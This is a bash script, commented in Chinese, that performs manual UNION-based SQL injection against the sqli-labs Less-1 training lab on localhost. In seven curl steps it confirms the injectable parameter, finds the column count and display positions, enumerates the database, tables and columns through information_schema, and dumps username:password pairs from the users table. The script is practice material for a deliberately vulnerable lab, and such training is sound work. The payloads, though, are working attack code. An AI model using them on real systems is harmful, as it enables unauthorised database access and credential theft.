#!/usr/bin/env bash
# sqli-labs Less-1 手工注入全流程（URL 都写死在脚本里，避免复制时被改坏）
# 用法：bash scripts/dvwa-sqli.sh
set -u
B="http://127.0.0.1:8083/Less-1/"

echo "① 判断注入点：id=1'（应报 SQL 语法错）"
curl -s "${B}?id=1%27" | grep -oE "You have an error in your SQL syntax.{0,50}" | head -1

echo
echo "② 判断列数：order by 3（正常）/ order by 4（报错 → 只有 3 列）"
curl -s "${B}?id=1%27%20order%20by%203--+" | grep -oE "Your Login name:[^<]*" | head -1
curl -s "${B}?id=1%27%20order%20by%204--+" | grep -oE "Unknown column[^<]{0,25}" | head -1

echo
echo "③ 找显示位：union select 1,2,3"
curl -s "${B}?id=-1%27%20union%20select%201,2,3--+" | grep -oE "Your Login name:[^<]*|Your Password:[^<]*"

echo
echo "④ 取当前库名"
curl -s "${B}?id=-1%27%20union%20select%201,2,database()--+" | grep -oE "Your Password:[^<]*" | head -1

echo
echo "⑤ 取库里所有表名"
curl -s "${B}?id=-1%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()--+" | grep -oE "Your Password:[^<]*" | head -1

echo
echo "⑥ 取 users 表的列名（0x7573657273 = 'users' 的十六进制，绕开引号）"
curl -s "${B}?id=-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x7573657273--+" | grep -oE "Your Password:[^<]*" | head -1

echo
echo "⑦ 取出 users 表里的账号:密码"
curl -s "${B}?id=-1%27%20union%20select%201,2,group_concat(username,0x3a,password)%20from%20users--+" | grep -oE "Your Password:[^<]*" | head -1
